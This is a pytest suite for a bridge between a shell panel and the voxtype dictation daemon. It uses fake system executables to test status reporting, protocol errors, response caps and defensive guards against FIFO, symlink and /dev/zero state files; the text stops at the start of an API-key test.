"""Tests for bridge.py — the JSON-over-stdio bridge to voxtype_tui.

Everything runs against temporary config/sidecar/models/HOME/runtime
directories selected through the environment overrides documented in
docs/DESIGN.md. Fake ``voxtype``, ``systemctl`` and ``pactl`` executables
are placed first on PATH so no test ever touches the real daemon, the
real ``~/.config/voxtype`` or the network.

Run:  /usr/bin/python3 -m pytest -q tests/test_bridge.py
"""
from __future__ import annotations

import contextlib
import json
import os
import re
import resource
import signal
import subprocess
import sys
import time
from pathlib import Path

import pytest

REPO = Path(__file__).resolve().parent.parent
BRIDGE = REPO / "bridge.py"
sys.path.insert(0, str(REPO))

import bridge  # noqa: E402

pytest.importorskip("voxtype_tui")

# Deliberately keeps comments so tests can prove comment preservation.
BASE_CONFIG = '''# Voxtype Configuration (test fixture)
state_file = "auto"

[hotkey]
# Hotkey is configured in Hyprland
enabled = false

[audio]
device = "default"
sample_rate = 16000
max_duration_secs = 60

[whisper]
# Model to use for transcription
model = "base.en"
language = "en"

[output]
mode = "type"
fallback_to_clipboard = true
type_delay_ms = 1
'''

FAKE_VOXTYPE = r'''#!/usr/bin/python3
import os, sys, time
from pathlib import Path

GPU_STATUS = """=== Voxtype Backend Status ===

Next launch: GPU (Vulkan) (no daemon running)
  Binary: /usr/lib/voxtype/voxtype-vulkan

Available backends:
  CPU (AVX2) - installed
  GPU (Vulkan) - active

GPUs detected:
  1. [NVIDIA] NVIDIA Corporation GA102 [GeForce RTX 3090] (rev a1)
  2. [AMD] Advanced Micro Devices, Inc. [AMD/ATI] Raphael (rev c6)

GPU selection: auto (first available)
"""

MODEL_LIST = """Voxtype Model Selection

--- Whisper (OpenAI, 99+ languages) ---

  [ 1] tiny             (  75 MB) multi - Fastest
 *[ 4] base.en          ( 142 MB) en - Good balance (default)

--- Parakeet (NVIDIA FastConformer, English) ---

  (not available - rebuild with --features parakeet)

--- Moonshine (Moonshine AI) ---

  (not available - rebuild with --features moonshine)
"""

log = os.environ.get("FAKE_VOXTYPE_LOG")
if log:
    with open(log, "a") as f:
        f.write(" ".join(sys.argv[1:]) + "\n")
a = sys.argv[1:]

if a[:1] == ["-c"] and a[2:3] == ["config"]:
    text = Path(a[1]).read_text()
    if "REJECTME" in text:
        print("Error: Configuration error: Invalid config: rejected by fake", file=sys.stderr)
        sys.exit(1)
    print("[engine]\nengine = \"whisper\"")
    sys.exit(0)

if a[:1] == ["setup"]:
    if a[1:2] == ["gpu"]:
        sys.stdout.write(GPU_STATUS)
        sys.exit(0)
    if a[1:2] == ["model"]:
        sys.stdout.write(MODEL_LIST)
        sys.exit(0)
    if a[1:2] == ["--download"]:
        name = a[a.index("--model") + 1]
        models = Path(os.environ["VOXTYPE_MODELS_DIR"])
        models.mkdir(parents=True, exist_ok=True)
        target = models / f"ggml-{name}.bin"
        sys.stdout.write(f"Downloading whisper model '{name}'...\n")
        sys.stdout.flush()
        if name == "broken":
            sys.stdout.write("curl: (22) The requested URL returned error: 404\n")
            sys.stdout.flush()
            sys.exit(1)
        for pct in ("12.5", "50.0", "87.5"):
            sys.stdout.write(f"\r  {pct}%   1.2M/s")
            sys.stdout.flush()
            time.sleep(0.02)
        if name == "slow":
            target.write_bytes(b"partial")
            sys.stdout.write("\nstill downloading\n")
            sys.stdout.flush()
            time.sleep(30)
            sys.exit(0)
        sys.stdout.write("\r  100.0%   1.2M/s\n")
        target.write_bytes(b"x" * 1024)
        sys.stdout.write(f"Model downloaded to {target}\n")
        sys.exit(0)

if a[:2] == ["record", "toggle"]:
    mode = os.environ.get("FAKE_VOXTYPE_TOGGLE", "ok")
    if mode == "fail":
        print("\x1b[31mError:\x1b[0m Failed to connect to daemon socket", file=sys.stderr)
        sys.exit(1)
    if mode == "silent-fail":
        sys.exit(7)
    if mode == "hang":
        time.sleep(30)
    print("Recording started")
    sys.exit(0)

print(f"fake voxtype: unsupported args {a}", file=sys.stderr)
sys.exit(2)
'''

FAKE_SYSTEMCTL = r'''#!/usr/bin/python3
import json, os, sys, time
from pathlib import Path

state_dir = Path(os.environ["FAKE_SYSTEMCTL_DIR"])
state_path = state_dir / "unit.json"
log = os.environ.get("FAKE_SYSTEMCTL_LOG")
if log:
    with open(log, "a") as f:
        f.write(" ".join(sys.argv[1:]) + "\n")

def load():
    if state_path.exists():
        return json.loads(state_path.read_text())
    return {"active": False, "pid": 0, "mono": 0}

def save(st):
    state_path.write_text(json.dumps(st))

def daemon_state_file():
    return Path(os.environ["XDG_RUNTIME_DIR"]) / "voxtype" / "state"

def start(st):
    st["active"] = True
    st["pid"] = (st.get("pid") or 4000) + 1
    st["mono"] = time.monotonic_ns() // 1000
    p = daemon_state_file()
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text("idle")

a = sys.argv[1:]
if a[:1] != ["--user"]:
    sys.exit(1)
verb = a[1]
st = load()
if verb == "show":
    active = "active" if st["active"] else "inactive"
    lines = []
    for prop in a[a.index("-p") + 1::2] if "-p" in a else []:
        pass
    props = [a[i + 1] for i, x in enumerate(a) if x == "-p"]
    for prop in props:
        if prop == "MainPID":
            lines.append(f"MainPID={st['pid'] if st['active'] else 0}")
        elif prop == "ActiveState":
            lines.append(f"ActiveState={active}")
        elif prop == "ExecMainStartTimestamp":
            lines.append("ExecMainStartTimestamp=" + (
                time.strftime("%a %Y-%m-%d %H:%M:%S %Z") if st["active"] else ""))
        elif prop == "ExecMainStartTimestampMonotonic":
            lines.append(f"ExecMainStartTimestampMonotonic={st['mono'] if st['active'] else 0}")
    print("\n".join(lines))
    sys.exit(0)
if verb == "restart":
    if os.environ.get("FAKE_SYSTEMCTL_NOOP_RESTART") != "1":
        start(st)
    save(st)
    sys.exit(0)
if verb == "start":
    if not st["active"]:
        start(st)
    save(st)
    sys.exit(0)
if verb == "stop":
    st["active"] = False
    st["pid"] = 0
    save(st)
    p = daemon_state_file()
    if p.exists():
        p.unlink()
    sys.exit(0)
if verb == "is-active":
    print("active" if st["active"] else "inactive")
    sys.exit(0 if st["active"] else 3)
if verb == "daemon-reload":
    sys.exit(0)
sys.exit(1)
'''

FAKE_PACTL = r'''#!/usr/bin/python3
import sys
if sys.argv[1:] == ["list", "sources", "short"]:
    print("0\talsa_output.pci-0000_00_1f.3.analog-stereo.monitor\tPipeWire\ts32le 2ch 48000Hz\tRUNNING")
    print("1\talsa_input.usb-Blue_Yeti-00.analog-stereo\tPipeWire\ts32le 2ch 48000Hz\tSUSPENDED")
    sys.exit(0)
sys.exit(1)
'''


class Env:
    """Handle on the isolated environment one test runs in."""

    def __init__(self, root: Path, monkeypatch: pytest.MonkeyPatch):
        self.root = root
        self.monkeypatch = monkeypatch
        self.home = root / "home"
        self.config = root / "cfg" / "config.toml"
        self.sidecar = root / "tui" / "metadata.json"
        self.models_dir = root / "models"
        self.runtime = root / "run"
        self.fakebin = root / "bin"
        self.sync_path = self.home / ".config" / "voxtype-tui" / "sync.json"
        self.dropin = self.home / ".config" / "systemd" / "user" / "voxtype.service.d" / "gpu.conf"
        self.state_file = self.runtime / "voxtype" / "state"
        self.voxtype_log = root / "voxtype.log"
        self.systemctl_log = root / "systemctl.log"
        self.systemctl_dir = root / "systemctl"

    # --- request helpers -------------------------------------------------

    def call(self, op: str, **args):
        return bridge.handle({"op": op, **args})

    def ok(self, op: str, **args):
        res = self.call(op, **args)
        assert res.get("ok") is True, res
        return res

    def fail(self, op: str, **args):
        res = self.call(op, **args)
        assert res.get("ok") is False, res
        assert isinstance(res.get("error"), str) and res["error"]
        assert "Traceback" not in res["error"]
        return res

    # --- fixtures on disk ------------------------------------------------

    def write_config(self, text: str = BASE_CONFIG) -> None:
        self.config.parent.mkdir(parents=True, exist_ok=True)
        self.config.write_text(text)

    def set_api_key(self, key: str) -> None:
        """Plant a remote API key the way a user would (config edit) —
        settings.set refuses secrets by design."""
        text = self.read_config()
        assert 'language = "en"' in text
        self.write_config(text.replace('language = "en"', f'language = "en"\nremote_api_key = "{key}"', 1))
        assert self.config_dict()["whisper"]["remote_api_key"] == key

    def read_config(self) -> str:
        return self.config.read_text()

    def config_dict(self) -> dict:
        import tomllib

        return tomllib.loads(self.read_config())

    def sidecar_dict(self) -> dict:
        return json.loads(self.sidecar.read_text())

    def add_model(self, engine: str, name: str, size: int = 2048) -> Path:
        from voxtype_tui import models

        p = models.model_file_path(engine, name, models_dir=self.models_dir)
        if engine == "whisper":
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_bytes(b"m" * size)
        else:
            p.mkdir(parents=True, exist_ok=True)
            (p / "model.onnx").write_bytes(b"m" * size)
        return p

    def daemon(self, active: bool, state: str | None = "idle") -> None:
        st = {"active": active, "pid": 4242 if active else 0,
              "mono": time.monotonic_ns() // 1000 if active else 0}
        self.systemctl_dir.mkdir(parents=True, exist_ok=True)
        (self.systemctl_dir / "unit.json").write_text(json.dumps(st))
        self.state_file.parent.mkdir(parents=True, exist_ok=True)
        if active and state:
            self.state_file.write_text(state)
        elif self.state_file.exists():
            self.state_file.unlink()

    def age_config(self, seconds: float = 120.0) -> None:
        t = time.time() - seconds
        os.utime(self.config, (t, t))

    def remove_fake(self, name: str) -> None:
        """Drop a fake executable AND restrict PATH to the fake bin dir so
        the real one (if installed on this machine) cannot be found."""
        (self.fakebin / name).unlink()
        self.monkeypatch.setenv("PATH", str(self.fakebin))

    def voxtype_calls(self) -> list[str]:
        return self.voxtype_log.read_text().splitlines() if self.voxtype_log.exists() else []

    def systemctl_calls(self) -> list[str]:
        return self.systemctl_log.read_text().splitlines() if self.systemctl_log.exists() else []

    def subprocess_env(self) -> dict[str, str]:
        return dict(os.environ)

    def run_cli(self, request, *args: str) -> subprocess.CompletedProcess:
        return subprocess.run(
            [sys.executable, str(BRIDGE), *args],
            input=json.dumps(request) if request is not None else "",
            capture_output=True, text=True, timeout=60, env=self.subprocess_env(),
        )


def _install(path: Path, body: str) -> None:
    path.write_text(body)
    path.chmod(0o755)


@pytest.fixture
def env(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Env:
    e = Env(tmp_path, monkeypatch)
    for d in (e.home, e.models_dir, e.runtime, e.fakebin, e.systemctl_dir,
              e.home / "Downloads"):
        d.mkdir(parents=True, exist_ok=True)
    _install(e.fakebin / "voxtype", FAKE_VOXTYPE)
    _install(e.fakebin / "systemctl", FAKE_SYSTEMCTL)
    _install(e.fakebin / "pactl", FAKE_PACTL)

    monkeypatch.setenv("HOME", str(e.home))
    monkeypatch.setenv("XDG_RUNTIME_DIR", str(e.runtime))
    monkeypatch.setenv("VOXTYPE_CONFIG", str(e.config))
    monkeypatch.setenv("VOXTYPE_TUI_SIDECAR", str(e.sidecar))
    monkeypatch.setenv("VOXTYPE_MODELS_DIR", str(e.models_dir))
    monkeypatch.setenv("PATH", f"{e.fakebin}{os.pathsep}{os.environ.get('PATH', '')}")
    monkeypatch.setenv("FAKE_VOXTYPE_LOG", str(e.voxtype_log))
    monkeypatch.setenv("FAKE_SYSTEMCTL_LOG", str(e.systemctl_log))
    monkeypatch.setenv("FAKE_SYSTEMCTL_DIR", str(e.systemctl_dir))
    monkeypatch.delenv("FAKE_SYSTEMCTL_NOOP_RESTART", raising=False)

    e.write_config()
    e.add_model("whisper", "base.en")
    e.daemon(active=False)
    return e


# ---------------------------------------------------------------------------
# Sanity: isolation + hygiene
# ---------------------------------------------------------------------------


def test_isolation_paths_are_temporary(env: Env):
    res = env.ok("status")
    assert res["config_path"] == str(env.config)
    assert str(env.root) in res["config_path"]
    assert Path.home() == env.home


def test_source_has_no_home_paths_or_usernames():
    src = BRIDGE.read_text()
    assert "/home/" not in src
    real_user = Path(os.path.expanduser("~")).name
    if real_user and real_user not in ("root", "home"):
        assert real_user not in src
    assert "getuid()" in src and "Path.home()" in src


def test_bridge_imports_only_stdlib_and_voxtype_tui():
    src = BRIDGE.read_text()
    imports = set(re.findall(r"^\s*(?:from|import)\s+([A-Za-z_][\w]*)", src, re.M))
    stdlib = set(sys.stdlib_module_names)
    third_party = {m for m in imports if m not in stdlib and m != "__future__"}
    assert third_party == {"voxtype_tui", "tomlkit"}, third_party


# ---------------------------------------------------------------------------
# Protocol plumbing
# ---------------------------------------------------------------------------


def test_unknown_op(env: Env):
    res = env.fail("nope")
    assert "unknown op" in res["error"]
    assert "status" in res["ops"]


def test_request_must_be_object(env: Env):
    assert bridge.handle([1, 2])["ok"] is False
    assert bridge.handle({"op": 5})["ok"] is False


def test_every_design_op_is_registered():
    design = (REPO / "docs" / "DESIGN.md").read_text()
    table_ops = set(re.findall(r"^\| `([a-z_.]+)` \|", design, re.M))
    table_ops |= set(re.findall(r"`([a-z_]+\.[a-z_]+)` / `([a-z_]+\.[a-z_]+)`", design)[0])
    table_ops.discard("daemon.start / daemon.stop")
    missing = table_ops - set(bridge.OPS)
    assert not missing, missing
    assert set(bridge.OPS) - table_ops == set(), set(bridge.OPS) - table_ops


def test_design_result_tables_match_response_shapes(env: Env):
    """The keys DESIGN.md advertises for each op must actually be emitted."""
    design = (REPO / "docs" / "DESIGN.md").read_text()

    def row(op: str) -> str:
        m = re.search(rf"^\| `{re.escape(op)}` \|.*$", design, re.M)
        assert m, op
        return m.group(0)

    env.daemon(active=True)
    status = env.ok("status")
    for key in ("config_exists", "state_file_path", "terminal_launcher_available", "picker_available"):
        assert key in row("status") and key in status
    for key in ("ready", "systemctl_available", "stale", "active_state", "start_monotonic_us"):
        assert key in row("status") and key in status["daemon"]

    ml = env.ok("models.list", engine="whisper")
    for key in ("models_dir", "total_bytes"):
        assert key in row("models.list") and key in ml

    env.add_model("whisper", "tiny", size=10)
    md = env.ok("models.delete", engine="whisper", name="tiny")
    assert "freed_bytes" in row("models.delete") and md["freed_bytes"] == 10
    assert md["daemon_stale"] is False and md["restart_needed"] == []

    va = env.ok("vocab.add", phrase="Omarchy")
    assert "daemon_stale" in design and va["daemon_stale"] is True

    dr = env.ok("daemon.restart", timeout=1)
    for key in ("changed", "ready", "ready_timeout", "active", "message"):
        assert key in row("daemon.restart") and key in dr

    assert "include_settings" in row("import.apply") and "include_settings" in row("import.preview")
    assert "vocab_remove:[] (always empty" in row("import.preview")
    assert "old_set" in row("import.preview") and "redacted" in row("import.preview")
    ds = env.ok("daemon.stop")
    m = re.search(r"^\| `daemon.start` / `daemon.stop` \|.*$", design, re.M)
    assert m and "daemon:{" in m.group(0) and "daemon" in ds


def test_cli_invalid_json_exits_zero_with_error(env: Env):
    r = subprocess.run([sys.executable, str(BRIDGE)], input="{not json",
                       capture_output=True, text=True, env=env.subprocess_env())
    assert r.returncode == 0
    out = json.loads(r.stdout)
    assert out["ok"] is False and "invalid JSON" in out["error"]


def test_cli_empty_request(env: Env):
    r = env.run_cli(None)
    assert r.returncode == 0
    out = json.loads(r.stdout)
    assert out["ok"] is False and out["error"] == "empty request"


@pytest.mark.parametrize("raw", ["null", "true", "1", '"x"', "[]", "[1, 2]"])
def test_cli_non_object_json_is_clean_error(env: Env, raw: str):
    r = subprocess.run([sys.executable, str(BRIDGE)], input=raw,
                       capture_output=True, text=True, env=env.subprocess_env())
    assert r.returncode == 0, r.stderr
    assert "Traceback" not in r.stderr
    out = json.loads(r.stdout)
    assert isinstance(out, dict)
    assert out["ok"] is False and "JSON object" in out["error"]


def test_cli_roundtrip_write_op(env: Env):
    r = env.run_cli({"op": "vocab.add", "phrase": "Omarchy"})
    assert r.returncode == 0, r.stderr
    out = json.loads(r.stdout)
    assert out["ok"] is True
    assert [v["phrase"] for v in out["snapshot"]["vocabulary"]] == ["Omarchy"]
    assert 'initial_prompt = "Omarchy"' in env.read_config()


def test_cli_exit_3_when_voxtype_tui_missing(env: Env):
    # -S drops site-packages, so voxtype_tui is unimportable while the
    # stdlib still is: exactly the "package missing" failure mode.
    r = subprocess.run([sys.executable, "-S", str(BRIDGE)], input='{"op":"status"}',
                       capture_output=True, text=True, env=env.subprocess_env())
    assert r.returncode == 3
    assert json.loads(r.stdout) == {"ok": False, "error": "voxtype-tui-missing"}


def test_cli_response_never_contains_traceback(env: Env, monkeypatch):
    def boom(args, paths):
        raise RuntimeError("kaboom")

    monkeypatch.setitem(bridge.OPS, "load", boom)
    res = env.fail("load")
    assert res["error"] == "RuntimeError: kaboom"


def test_main_refuses_to_emit_oversize_response(env: Env, monkeypatch):
    import io

    def huge(args, paths):
        return {"ok": True, "op": "load", "blob": "x" * (bridge.MAX_RESPONSE_BYTES + 1)}

    monkeypatch.setitem(bridge.OPS, "load", huge)
    out = io.StringIO()
    code = bridge.main([], stdin=io.StringIO('{"op":"load"}'), stdout=out)
    assert code == 0
    text = out.getvalue()
    assert len(text.encode()) < 1000
    res = json.loads(text)
    assert res == {"ok": False, "error": "response too large", "op": "load",
                   "limit_bytes": bridge.MAX_RESPONSE_BYTES}

    # Just under the cap passes through untouched.
    def big(args, paths):
        return {"ok": True, "blob": "x" * (bridge.MAX_RESPONSE_BYTES - 100)}

    monkeypatch.setitem(bridge.OPS, "load", big)
    out = io.StringIO()
    assert bridge.main([], stdin=io.StringIO('{"op":"load"}'), stdout=out) == 0
    assert json.loads(out.getvalue())["ok"] is True
    assert bridge.MAX_RESPONSE_BYTES == 2_000_000


def test_main_handles_unserialisable_response(env: Env, monkeypatch):
    import io

    monkeypatch.setitem(bridge.OPS, "load", lambda a, p: {"ok": True, "x": object()})
    out = io.StringIO()
    assert bridge.main([], stdin=io.StringIO('{"op":"load"}'), stdout=out) == 0
    res = json.loads(out.getvalue())
    assert res["ok"] is False and "unserialisable" in res["error"]


# ---------------------------------------------------------------------------
# status
# ---------------------------------------------------------------------------


def test_status_stopped_daemon(env: Env):
    res = env.ok("status")
    assert res["voxtype_installed"] is True
    assert res["tui_version"]
    assert res["daemon"]["active"] is False
    assert res["daemon"]["state"] == "stopped"
    assert res["daemon"]["main_pid"] is None
    assert res["daemon"]["stale"] is False
    assert res["engine"] == "whisper"
    assert res["model"] == {"name": "base.en", "path": str(env.models_dir / "ggml-base.en.bin"), "present": True}
    assert res["hotkey"] == {"key": None, "modifiers": [], "mode": "push_to_talk", "enabled": False}
    assert res["output_mode"] == "type"


ENGINES = ("whisper", "moonshine", "sensevoice", "paraformer", "dolphin", "omnilingual", "parakeet")


def _engine_config(engine: str, name: str) -> str:
    if engine == "whisper":
        return BASE_CONFIG.replace('model = "base.en"', f'model = "{name}"')
    return f'engine = "{engine}"\n[{engine}]\nmodel = "{name}"\n' + BASE_CONFIG


def test_status_engine_list_matches_tui():
    from voxtype_tui import settings

    assert set(ENGINES) == set(settings.ENGINES)
    assert set(bridge._MODEL_PATH_TEMPLATES) == set(settings.ENGINES)


@pytest.mark.parametrize("engine", ENGINES)
def test_status_model_path_matches_tui(env: Env, engine: str):
    from voxtype_tui import models

    assert bridge._model_file_path(engine, "some-name", env.models_dir) == \
        models.model_file_path(engine, "some-name", models_dir=env.models_dir)


@pytest.mark.parametrize("engine", ENGINES)
def test_status_is_fast_and_never_runs_voxtype_setup(env: Env, engine: str):
    env.add_model(engine, "m1")
    env.write_config(_engine_config(engine, "m1"))
    env.daemon(active=True)
    t = time.monotonic()
    res = env.ok("status")
    elapsed = time.monotonic() - t
    assert elapsed < 0.15, elapsed
    assert res["engine"] == engine and res["model"]["present"] is True
    assert env.voxtype_calls() == []
    assert env.systemctl_calls() == ["--user show voxtype -p MainPID -p ActiveState -p ExecMainStartTimestamp -p ExecMainStartTimestampMonotonic"]


@pytest.mark.parametrize("engine", ENGINES)
def test_status_does_not_import_textual(env: Env, engine: str):
    env.add_model(engine, "m1")
    env.write_config(_engine_config(engine, "m1"))
    code = (
        "import sys; sys.path.insert(0, %r); import bridge; "
        "r = bridge.handle({'op': 'status'}); "
        "print(r['ok'], r['engine'], r['model']['present'], "
        "'textual' in sys.modules, 'voxtype_tui.models' in sys.modules)"
        % str(REPO)
    )
    r = subprocess.run([sys.executable, "-c", code], capture_output=True, text=True,
                       env=env.subprocess_env())
    assert r.stdout.strip() == f"True {engine} True False False", r.stderr


@pytest.mark.parametrize("word", ["idle", "recording", "transcribing"])
def test_status_reports_daemon_state_word(env: Env, word: str):
    env.daemon(active=True, state=word)
    env.age_config()
    res = env.ok("status")
    assert res["daemon"]["active"] is True
    assert res["daemon"]["state"] == word
    assert res["daemon"]["main_pid"] == 4242
    assert res["daemon"]["started_at"]
    assert res["daemon"]["stale"] is False


def test_status_stale_when_config_newer_than_daemon_start(env: Env):
    env.daemon(active=True)
    env.age_config()
    assert env.ok("status")["daemon"]["stale"] is False
    time.sleep(0.01)
    env.write_config(BASE_CONFIG + "\n# edited\n")
    assert env.ok("status")["daemon"]["stale"] is True


def test_status_stale_when_gpu_dropin_newer_than_daemon_start(env: Env):
    env.daemon(active=True)
    env.age_config()
    env.ok("gpu.set_device", vendor="nvidia")
    assert env.ok("status")["daemon"]["stale"] is True


def test_status_active_without_state_file_is_idle_not_ready(env: Env):
    env.daemon(active=True, state=None)
    res = env.ok("status")
    assert res["daemon"]["state"] == "idle"
    assert res["daemon"]["ready"] is False


def test_status_model_missing(env: Env):
    env.write_config(BASE_CONFIG.replace('model = "base.en"', 'model = "large-v3"'))
    res = env.ok("status")
    assert res["model"]["name"] == "large-v3"
    assert res["model"]["present"] is False


def test_status_custom_model_path(env: Env):
    custom = env.root / "custom.bin"
    custom.write_bytes(b"x")
    env.write_config(BASE_CONFIG.replace('model = "base.en"', f'model = "{custom}"'))
    res = env.ok("status")
    assert res["model"]["path"] == str(custom)
    assert res["model"]["present"] is True


def test_status_non_whisper_engine(env: Env):
    env.add_model("parakeet", "parakeet-tdt-0.6b-v3")
    env.write_config('engine = "parakeet"\n[parakeet]\nmodel = "parakeet-tdt-0.6b-v3"\n' + BASE_CONFIG)
    res = env.ok("status")
    assert res["engine"] == "parakeet"
    assert res["model"]["name"] == "parakeet-tdt-0.6b-v3"
    assert res["model"]["present"] is True


def test_status_voxtype_binary_missing(env: Env):
    env.remove_fake("voxtype")
    res = env.ok("status")
    assert res["voxtype_installed"] is False


def test_status_without_config_file(env: Env):
    env.config.unlink()
    res = env.ok("status")
    assert res["config_exists"] is False
    assert res["model"]["name"] is None
    assert res["engine"] == "whisper"


def test_status_corrupt_config_warns(env: Env):
    env.write_config("this is not = [ toml")
    res = env.ok("status")
    assert res["warnings"] and "could not be parsed" in res["warnings"][0]


def test_status_state_file_disabled(env: Env):
    env.daemon(active=True, state="recording")
    env.write_config(BASE_CONFIG.replace('state_file = "auto"', 'state_file = "disabled"'))
    res = env.ok("status")
    assert res["daemon"]["state"] == "idle"
    assert res["daemon"]["ready"] is False


def test_status_custom_state_file_path(env: Env):
    custom = env.root / "custom-state"
    custom.write_text("transcribing")
    env.daemon(active=True, state="idle")
    env.write_config(BASE_CONFIG.replace('state_file = "auto"', f'state_file = "{custom}"'))
    assert env.ok("status")["daemon"]["state"] == "transcribing"


def test_status_without_systemctl(env: Env):
    env.remove_fake("systemctl")
    res = env.ok("status")
    assert res["daemon"]["systemctl_available"] is False
    assert res["daemon"]["state"] == "stopped"


def test_status_state_file_path_resolution(env: Env, monkeypatch):
    # "auto" -> $XDG_RUNTIME_DIR/voxtype/state
    assert env.ok("status")["state_file_path"] == str(env.runtime / "voxtype" / "state")
    # missing key behaves like "auto"
    env.write_config(BASE_CONFIG.replace('state_file = "auto"\n', ""))
    assert env.ok("status")["state_file_path"] == str(env.runtime / "voxtype" / "state")
    # no XDG_RUNTIME_DIR -> /run/user/<uid>/voxtype/state
    monkeypatch.delenv("XDG_RUNTIME_DIR")
    assert env.ok("status")["state_file_path"] == f"/run/user/{os.getuid()}/voxtype/state"
    monkeypatch.setenv("XDG_RUNTIME_DIR", str(env.runtime))
    # explicit path (with ~ expansion)
    env.write_config(BASE_CONFIG.replace('state_file = "auto"', 'state_file = "~/vox.state"'))
    assert env.ok("status")["state_file_path"] == str(env.home / "vox.state")
    # disabled -> null
    env.write_config(BASE_CONFIG.replace('state_file = "auto"', 'state_file = "disabled"'))
    assert env.ok("status")["state_file_path"] is None
    # no config at all -> still the auto path
    env.config.unlink()
    assert env.ok("status")["state_file_path"] == str(env.runtime / "voxtype" / "state")


def test_status_reports_helper_availability(env: Env):
    monkeypatch = env.monkeypatch
    monkeypatch.setenv("PATH", str(env.fakebin))
    res = env.ok("status")
    assert res["terminal_launcher_available"] is False
    assert res["picker_available"] is False
    _install(env.fakebin / "omarchy-launch-terminal", "#!/bin/sh\nexit 0\n")
    _install(env.fakebin / "zenity", "#!/bin/sh\nexit 0\n")
    res = env.ok("status")
    assert res["terminal_launcher_available"] is True
    assert res["picker_available"] is True
    assert env.voxtype_calls() == []  # availability is a PATH lookup, never a run


# ---------------------------------------------------------------------------
# F3: the state file is config-controlled and polled every 2 s
# ---------------------------------------------------------------------------


@contextlib.contextmanager
def memory_ceiling(mib: int, what: str):
    """Hard address-space limit for a block that must never allocate much.

    The bugs these tests pin are *memory bombs*: unbounded reads of
    /dev/zero, /dev/urandom or a growing file. `deadline` below only
    catches a block that never returns — an unbounded read returns just
    fine, after eating every byte of RAM. Running the suite against
    unfixed code once drove pytest to 39 GiB RSS and got the whole
    session OOM-killed, so the ceiling is part of the test, not a
    convenience: a regression must fail this process, not the machine.

    RLIMIT_AS makes the runaway allocation raise MemoryError inside the
    bridge instead, which `fail()` reports as an ordinary error. The
    limit is restored on exit so later tests keep the full heap.
    """
    soft, hard = resource.getrlimit(resource.RLIMIT_AS)
    ceiling = mib * 1024 * 1024
    if hard != resource.RLIM_INFINITY and hard < ceiling:
        ceiling = hard
    resource.setrlimit(resource.RLIMIT_AS, (ceiling, hard))
    try:
        yield
    except MemoryError as e:  # pragma: no cover - only on a regression
        raise AssertionError(
            f"{what} allocated past {mib} MiB; the read is not bounded"
        ) from e
    finally:
        resource.setrlimit(resource.RLIMIT_AS, (soft, hard))


@contextlib.contextmanager
def deadline(seconds: float, what: str):
    """Hard wall-clock limit for a block that must never block.

    Uses SIGALRM rather than pytest-timeout so the suite keeps running on
    a bare `pytest` install: a regression fails loudly instead of hanging
    CI forever, which is the whole point of the FIFO tests below.
    """
    def fire(_signum, _frame):
        raise AssertionError(f"{what} did not return within {seconds}s")

    previous = signal.signal(signal.SIGALRM, fire)
    signal.setitimer(signal.ITIMER_REAL, seconds)
    try:
        yield
    finally:
        signal.setitimer(signal.ITIMER_REAL, 0)
        signal.signal(signal.SIGALRM, previous)


def test_read_state_word_does_not_block_on_fifo(tmp_path: Path):
    """F3 regression: a FIFO at state_file used to hang the bridge forever.

    `status` polls this every 2 s while the panel is open, so each hung
    read leaked a process inside omarchy-shell. The timeout makes a
    regression fail loudly instead of hanging CI.
    """
    fifo = tmp_path / "state"
    os.mkfifo(fifo)
    with deadline(10, "_read_state_word on a FIFO"):
        assert bridge._read_state_word(fifo) is None


def test_status_does_not_block_on_fifo_state_file(env: Env):
    """The same guard through the real `status` op, with the FIFO named
    by config exactly as an attacker-supplied bundle would name it."""
    fifo = env.root / "fifo-state"
    os.mkfifo(fifo)
    env.write_config(BASE_CONFIG.replace('state_file = "auto"', f'state_file = "{fifo}"'))
    env.daemon(active=True)
    with deadline(15, "status with a FIFO state_file"):
        res = env.ok("status")
    assert res["state_file_path"] == str(fifo)
    assert res["daemon"]["ready"] is False
    assert res["daemon"]["state"] == "idle"


def test_wait_for_daemon_ready_does_not_block_on_fifo(env: Env):
    """The 0.15 s poll loop calls the same helper up to 400 times."""
    fifo = env.root / "fifo-state"
    os.mkfifo(fifo)
    started = time.monotonic()
    with deadline(15, "_wait_for_daemon_ready on a FIFO"):
        assert bridge._wait_for_daemon_ready(fifo, timeout=0.5) is False
    elapsed = time.monotonic() - started
    # It really polled for the whole timeout rather than erroring out.
    assert 0.4 < elapsed < 5.0, elapsed


def test_read_state_word_rejects_non_regular_files(tmp_path: Path):
    """Directories, symlinks and devices are not the daemon's state file."""
    d = tmp_path / "adir"
    d.mkdir()
    assert bridge._read_state_word(d) is None

    real = tmp_path / "real"
    real.write_text("recording\n")
    link = tmp_path / "link"
    link.symlink_to(real)
    # O_NOFOLLOW: a symlink at the configured path is refused outright.
    assert bridge._read_state_word(link) is None
    assert bridge._read_state_word(real) == "recording"

    assert bridge._read_state_word(tmp_path / "missing") is None

    dev = Path("/dev/zero")
    if dev.exists():
        # Unfixed, this read is unbounded: cap the heap so a regression
        # fails the test instead of OOM-killing the session.
        with memory_ceiling(512, "_read_state_word on /dev/zero"):
            with deadline(20, "_read_state_word on /dev/zero"):
                assert bridge._read_state_word(dev) is None


def test_read_state_word_is_size_capped(tmp_path: Path):
    """A regular file is still only read up to the cap."""
    big = tmp_path / "state"
    big.write_bytes(b"x" * (5 * 1024 * 1024))
    word = bridge._read_state_word(big)
    assert word is not None
    assert len(word) <= bridge.MAX_STATE_WORD_BYTES
    assert bridge.MAX_STATE_WORD_BYTES <= 256


# ---------------------------------------------------------------------------
# load / options / models.list / gpu.status / dictionary.preview
# ---------------------------------------------------------------------------


def test_load_snapshot_shape(env: Env):
    snap = env.ok("load")["snapshot"]
    assert snap["vocabulary"] == []
    assert snap["vocab_tokens"] == 0
    assert snap["vocab_token_limit"] == 224
    assert snap["replacements"] == []
    assert snap["categories"] == ["Replacement", "Capitalization"]
    assert snap["settings"]["whisper.model"] == "base.en"
    assert snap["settings"]["hotkey.enabled"] is False
    assert snap["settings"]["audio.max_duration_secs"] == 60
    assert snap["settings"]["output.fallback_to_clipboard"] is True
    assert snap["settings"]["whisper.remote_api_key_set"] is False
    assert "whisper.remote_api_key" not in snap["settings"]
    assert "hotkey.key" not in snap["settings"]  # absent keys are omitted
    assert "whisper.initial_prompt" in snap["restart_sensitive"]
    assert snap["warnings"] == []
    assert snap["migrations_applied"] == []
    assert snap["sync"] == {"applied_from": None, "conflicts": [], "missing_model": None}


def test_load_never_returns_api_key(env: Env):
